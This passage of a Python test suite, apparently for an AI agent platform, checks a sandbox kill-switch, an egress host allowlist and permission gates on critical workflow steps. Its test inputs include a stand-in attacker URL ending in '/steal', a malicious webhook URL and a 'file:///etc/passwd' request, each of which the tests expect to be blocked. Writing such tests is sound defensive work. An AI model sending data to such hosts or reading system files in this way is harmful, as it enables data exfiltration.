        from core.sandbox_killrun import KillRunRegistry
        reg = KillRunRegistry()
        reg.reset()
        reg.trigger("run1", "bad thing")
        try:
            with patch("core.sandbox_audit.write_violation") as wv:
                d = evaluate_tool_call("t", {}, _gate_context())
        finally:
            reg.reset()
        assert d.decision == BLOCKED
        assert d.killrun_triggered is True
        assert d.metadata_json["killrun"] is True
        wv.assert_called_once()

    def test_non_killrun_exception_fails_open(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        with patch("core.sandbox_policy.PolicyIssuer.issue", side_effect=RuntimeError("boom")):
            d = evaluate_tool_call("t", {}, _gate_context())
        assert d.decision == ALLOWED
        assert "error" in d.metadata_json

    def test_killrun_aborted_propagates(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        from core.sandbox_tripwire import check as real_check

        def raiser(**kwargs):
            raise KillRunAborted("killed elsewhere")

        with patch("core.sandbox_tripwire.check", raiser):
            with pytest.raises(KillRunAborted):
                evaluate_tool_call("browser_screenshot", {"cmd": "ls"}, _gate_context())


# ===========================================================================
# core/sandbox_egress_proxy.py
# ===========================================================================

class TestHostNormalization:
    def test_empty_and_none(self):
        assert normalize_host(None) == ""
        assert normalize_host("") == ""
        assert normalize_host("   ") == ""

    def test_lowercase_strip_port_trailing_dot(self):
        assert normalize_host("API.OpenAI.com.") == "api.openai.com"
        assert normalize_host("api.openai.com:443") == "api.openai.com"
        assert normalize_host("api.openai.com:443/path") == "api.openai.com"

    def test_ipv6_bracket_preserved(self):
        assert normalize_host("[::1]:8080") == "[::1]:8080"

    def test_host_matches(self):
        assert host_matches("api.openai.com", ("api.openai.com",)) is True
        assert host_matches("", ("a",)) is False
        assert host_matches("evil.com", ("api.openai.com",)) is False

    def test_host_matches_wildcard(self):
        allow = ("*.example.com",)
        assert host_matches("example.com", allow) is True
        assert host_matches("sub.example.com", allow) is True
        assert host_matches("badexample.com", allow) is False
        assert host_matches("a.b.example.com", allow) is True

    def test_effective_allowlist_union(self):
        allow = effective_allowlist(_policy(egress_hosts=("my.corp.io",)))
        assert "api.openai.com" in allow
        assert "my.corp.io" in allow
        assert "pypi.org" in allow


class TestCheckEgress:
    def test_disabled_allows(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "false")
        d = check_egress(_policy(), url="https://evil.com/x", tool_name="t")
        assert d.decision == ALLOWED
        assert d.metadata_json["egress_check"] == "disabled"

    def test_non_http_scheme_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        d = check_egress(_policy(), url="file:///etc/passwd", tool_name="t")
        assert d.decision == BLOCKED
        assert "file" in d.violation_detail
        assert d.enforced is False

    def test_no_host_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d = check_egress(_policy(), url="http:///just/path", tool_name="t")
        assert d.decision == BLOCKED
        assert "no host" in d.violation_detail

    def test_allowlisted_host(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d = check_egress(_policy(), url="https://api.openai.com:443/v1/chat", tool_name="t")
        assert d.decision == ALLOWED
        assert d.metadata_json["host"] == "api.openai.com"

    def test_policy_egress_host_allowed(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d = check_egress(_policy(egress_hosts=("internal.corp",)), url="http://internal.corp/x", tool_name="t")
        assert d.decision == ALLOWED

    def test_denied_host_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "true")
        d = check_egress(_policy(), url="https://evil.example.com/steal", tool_name="t", args_hash="h")
        assert d.decision == BLOCKED
        assert d.violation_type == "egress_host"
        assert d.enforced is True
        assert d.metadata_json["allowlist_size"] > 0

    def test_parse_error_fails_closed(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        with patch("core.sandbox_egress_proxy.urlparse", side_effect=ValueError("bad url")):
            d = check_egress(_policy(), url="::not-a-url::", tool_name="t")
        assert d.decision == BLOCKED
        assert "egress check error" in d.violation_detail


class TestEgressValidate:
    def test_extract_urls(self):
        assert extract_urls_from_args({}) == {}
        assert extract_urls_from_args(None) == {}
        out = extract_urls_from_args({
            "url": "https://a.com", "endpoint": "http://b.com",
            "webhook_url": "https://c.com", "callback_url": "d.com",
            "api_url": "e", "base_url": "f", "host": "not-a-url",
            "other": "https://ignored.com",
        })
        assert set(out) == {"url", "endpoint", "webhook_url"}

    def test_validate_no_url_args(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d = egress_validate(_policy(), "t", {"cmd": "ls"})
        assert d.decision == ALLOWED
        assert d.metadata_json["reason"] == "no_url_args"

    def test_validate_allowed_url(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d = egress_validate(_policy(), "t", {"url": "https://pypi.org/simple/"})
        assert d.decision == ALLOWED
        assert d.args_hash  # allowed results carry only the correlation hash

    def test_validate_blocked_dominates(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d = egress_validate(_policy(), "t", {
            "url": "https://pypi.org/ok",
            "webhook_url": "https://evil.example.com/x",
        })
        assert d.decision == BLOCKED
        assert d.metadata_json["arg_key"] == "webhook_url"

    def test_validate_restricted_worst(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        restricted = SandboxDecision(
            decision=RESTRICTED, phase="D", tool_name="t",
            metadata_json={"host": "x"},
        )
        with patch("core.sandbox_egress_proxy.check_egress", return_value=restricted):
            d = egress_validate(_policy(), "t", {"url": "https://a.com", "endpoint": "https://b.com"})
        assert d.decision == RESTRICTED


class TestDualProxies:
    def test_base_proxy(self):
        p = _BaseProxy(("api.openai.com",))
        assert p.can_connect("API.OPENAI.COM") is True
        assert p.can_connect("evil.com") is False
        assert p.allowlist == ("api.openai.com",)

    def test_llm_proxy(self):
        p = LlmProxy()
        assert p.can_connect("api.anthropic.com") is True
        assert p.can_connect("pypi.org") is False  # not an LLM host

    def test_tool_proxy(self):
        p = ToolProxy(_policy(egress_hosts=("my.corp.io",)))
        assert p.can_connect("my.corp.io") is True
        assert p.can_connect("pypi.org") is True  # baseline
        assert p.can_connect("evil.com") is False

    def test_dual_split(self):
        llm, tool = get_dual_proxy_split(_policy())
        assert isinstance(llm, LlmProxy)
        assert isinstance(tool, ToolProxy)


# ===========================================================================
# core/workflow_security.py
# ===========================================================================

class _Step:
    """Object-style step (duck-type of WorkflowStep dataclass)."""

    def __init__(self, step_type=None, parameters=None, service=None, action=None):
        self.step_type = step_type
        self.parameters = parameters
        self.service = service
        self.action = action


class StepTypeEnum(str, enum.Enum):
    TERMINAL = "terminal"
    EMAIL_SEND = "email_send"


class TestNormalizeStep:
    def test_dict_passthrough(self):
        d = {"step_type": "x"}
        assert ws._normalize_step(d) is d

    def test_object_with_enum_step_type(self):
        out = ws._normalize_step(_Step(step_type=StepTypeEnum.TERMINAL, parameters={"k": "v"}))
        assert out["step_type"] == "terminal"
        assert out["parameters"] == {"k": "v"}

    def test_object_with_plain_step_type(self):
        out = ws._normalize_step(_Step(step_type="browser", service="mcp", action="browser_navigate"))
        assert out["step_type"] == "browser"
        assert out["service"] == "mcp"
        assert out["action"] == "browser_navigate"

    def test_parameters_not_a_dict_coerced(self):
        out = ws._normalize_step(_Step(step_type="terminal", parameters="not-a-dict"))
        assert out["parameters"] == {}

    def test_missing_parameters_defaults(self):
        out = ws._normalize_step(_Step(step_type="terminal"))
        assert out["parameters"] == {}
        assert out["service"] is None

    def test_identity_keys_carried(self):
        step = SimpleNamespace(step_type="x", step_id="s1", id="i1", name="n1", description="d1")
        out = ws._normalize_step(step)
        assert out["step_id"] == "s1"
        assert out["id"] == "i1"
        assert out["name"] == "n1"
        assert out["description"] == "d1"

    def test_identity_keys_absent(self):
        out = ws._normalize_step(_Step(step_type="x"))
        for key in ("step_id", "id", "name", "description"):
            assert key not in out


class TestCriticalToolDetection:
    def test_mcp_missing_tool_critical(self):
        assert ws._has_critical_mcp_tool({"service": "mcp", "parameters": {}}) is True

    def test_mcp_templated_tool_critical(self):
        assert ws._has_critical_mcp_tool({"service": "mcp", "action": "${t}", "parameters": {}}) is True

    def test_mcp_critical_tool(self):
        assert ws._has_critical_mcp_tool({"service": "mcp", "action": "terminal_command", "parameters": {}}) is True

    def test_mcp_benign_tool(self):
        assert ws._has_critical_mcp_tool({"service": "mcp", "action": "list_tools", "parameters": {}}) is False

    def test_non_mcp_critical_tool_in_params(self):
        assert ws._has_critical_mcp_tool({"parameters": {"tool_name": "email_send"}}) is True
        assert ws._has_critical_mcp_tool({"parameters": {"tool_name": "${x}"}}) is True

    def test_non_mcp_benign(self):
        assert ws._has_critical_mcp_tool({"step_type": "browser", "parameters": {}}) is False
        assert ws._has_critical_mcp_tool({}) is False

    def test_tool_name_from_action_for_non_mcp(self):
        assert ws._has_critical_mcp_tool({"step_type": "mcp", "action": "browser_navigate"}) is True


class TestHasCriticalStep:
    def test_empty_and_none(self):
        assert ws.has_critical_step(None) is False
        assert ws.has_critical_step([]) is False

    def test_orchestrator_step_types(self):
        assert ws.has_critical_step([{"step_type": "terminal", "parameters": {}}]) is True
        assert ws.has_critical_step([{"step_type": "browser"}]) is True
        assert ws.has_critical_step([{"step_type": "email_send"}]) is True
        assert ws.has_critical_step([{"step_type": "slack"}]) is False

    def test_universal_integration_email_connectors(self):
        for svc in ("email", "gmail", "outlook"):
            assert ws.has_critical_step(
                [{"step_type": "universal_integration", "service": svc, "parameters": {}}]
            ) is True
        assert ws.has_critical_step(
            [{"step_type": "universal_integration", "parameters": {"service": "slack"}}]
        ) is False

    def test_mcp_step_critical(self):
        assert ws.has_critical_step([{"service": "mcp", "action": "terminal_command"}]) is True

    def test_benign_steps(self):
        assert ws.has_critical_step([{"step_type": "transform", "parameters": {}}]) is False

    def test_non_dict_step_skipped(self, monkeypatch):
        monkeypatch.setattr("core.workflow_security._normalize_step", lambda s: "not-a-dict")
        assert ws.has_critical_step(["weird-step"]) is False


class TestHasCriticalDefinition:
    def test_none(self):
        assert ws.has_critical_definition(None) is False

    def test_list(self):
        assert ws.has_critical_definition([{"step_type": "terminal"}]) is True

    def test_dict_with_steps(self):
        assert ws.has_critical_definition({"steps": [{"step_type": "terminal"}]}) is True
        assert ws.has_critical_definition({"steps": []}) is False

    def test_object_with_steps(self):
        assert ws.has_critical_definition(SimpleNamespace(steps=[{"service": "mcp", "action": "email_send"}])) is True
        assert ws.has_critical_definition(SimpleNamespace(steps=[])) is False


class TestRequireGates:
    def _patch_permission(self, monkeypatch, allowed: bool):
        monkeypatch.setattr(
            "core.rbac_service.RBACService.check_permission",
            staticmethod(lambda user, perm: allowed),
        )

    def test_executor_no_critical_ok(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        asyncio.run(ws.require_workflow_executor(_User(), [{"step_type": "transform"}]))

    def test_executor_critical_with_permission_ok(self, monkeypatch):
        self._patch_permission(monkeypatch, True)
        asyncio.run(ws.require_workflow_executor(_User(), [{"step_type": "terminal"}]))

    def test_executor_critical_without_permission_403(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        with pytest.raises(Exception) as ei:
            asyncio.run(ws.require_workflow_executor(_User(), [{"step_type": "terminal"}]))
        assert ei.value.status_code == 403
        assert "WORKFLOW_MANAGE" in str(ei.value.detail)

    def test_executor_definition_gate(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        with pytest.raises(Exception) as ei:
            asyncio.run(ws.require_workflow_executor_definition(_User(), [{"step_type": "terminal"}]))
        assert ei.value.status_code == 403
        asyncio.run(ws.require_workflow_executor_definition(_User(), [{"step_type": "slack"}]))

    def test_orchestrator_unknown_definition_403(self):
        assert ws.resolve_orchestrator_steps(SimpleNamespace(), "wf1") is None
        with pytest.raises(Exception) as ei:
            asyncio.run(ws.require_workflow_executor_orchestrator(_User(), SimpleNamespace(), "wf1"))
        assert ei.value.status_code == 403

    def test_orchestrator_from_workflows(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        orch = SimpleNamespace(workflows={"wf1": SimpleNamespace(steps=[{"step_type": "terminal"}])})
        with pytest.raises(Exception) as ei:
            asyncio.run(ws.require_workflow_executor_orchestrator(_User(), orch, "wf1"))
        assert ei.value.status_code == 403

    def test_orchestrator_template_fallback(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        orch = SimpleNamespace(template_manager=SimpleNamespace(
            get_template=lambda wid: SimpleNamespace(steps=[{"step_type": "terminal"}])
        ))
        with pytest.raises(Exception) as ei:
            asyncio.run(ws.require_workflow_executor_orchestrator(_User(), orch, "wf1"))
        assert ei.value.status_code == 403

    def test_orchestrator_template_raises_returns_none(self, monkeypatch):
        orch = SimpleNamespace(template_manager=SimpleNamespace(
            get_template=lambda wid: (_ for _ in ()).throw(RuntimeError("missing"))
        ))
        assert ws.resolve_orchestrator_steps(orch, "wf1") is None

    def test_orchestrator_workflow_without_steps(self, monkeypatch):
        self._patch_permission(monkeypatch, True)
        orch = SimpleNamespace(workflows={"wf1": SimpleNamespace()})
        assert ws.resolve_orchestrator_steps(orch, "wf1") is None

    def test_orchestrator_benign_template(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        orch = SimpleNamespace(template_manager=SimpleNamespace(
            get_template=lambda wid: SimpleNamespace(steps=[{"step_type": "slack"}])
        ))
        asyncio.run(ws.require_workflow_executor_orchestrator(_User(), orch, "wf1"))

    def test_critical_tool_exempt_with_permission(self, monkeypatch):
        self._patch_permission(monkeypatch, True)
        asyncio.run(ws.require_critical_tool(_User(), "terminal_command"))

    def test_critical_tool_refused(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        for name in ("terminal_command", "", "${templated}", "EMAIL_SEND"):
            with pytest.raises(Exception) as ei:
                asyncio.run(ws.require_critical_tool(_User(), name))
            assert ei.value.status_code == 403

    def test_critical_tool_benign_allowed(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        asyncio.run(ws.require_critical_tool(_User(), "list_tools"))

    def test_trigger_tool_exempt_with_permission(self, monkeypatch):
        self._patch_permission(monkeypatch, True)
        asyncio.run(ws.require_workflow_trigger_tool(_User(), "trigger_workflow"))

    def test_trigger_tool_refused(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        with pytest.raises(Exception) as ei:
            asyncio.run(ws.require_workflow_trigger_tool(_User(), "trigger_workflow"))
        assert ei.value.status_code == 403

    def test_trigger_tool_benign_allowed(self, monkeypatch):
        self._patch_permission(monkeypatch, False)
        asyncio.run(ws.require_workflow_trigger_tool(_User(), "other_tool"))


class TestAutomationNodes:
    def test_none_defn(self):
        assert ws.has_critical_automation_nodes(None) is False

    def test_dict_critical_action(self):
        assert ws.has_critical_automation_nodes(
            {"nodes": [{"config": {"actionType": "send_email"}}]}
        ) is True
        assert ws.has_critical_automation_nodes({"nodes": []}) is False
        assert ws.has_critical_automation_nodes({"nodes": [{"config": {"actionType": "transform"}}]}) is False

    def test_object_defn_without_nodes(self):
        assert ws.has_critical_automation_nodes(SimpleNamespace(x=1)) is False

    def test_object_node_without_config(self):
        assert ws.has_critical_automation_nodes(
            SimpleNamespace(nodes=[SimpleNamespace(actionType="send_email")])
        ) is False

    def test_object_node_non_dict_config(self):
        assert ws.has_critical_automation_nodes(
            SimpleNamespace(nodes=[SimpleNamespace(config="not-a-dict")])
        ) is False

    def test_object_node_dict_config_critical(self):
        assert ws.has_critical_automation_nodes(
            SimpleNamespace(nodes=[SimpleNamespace(config={"actionType": "run_agent_task"})])
        ) is True
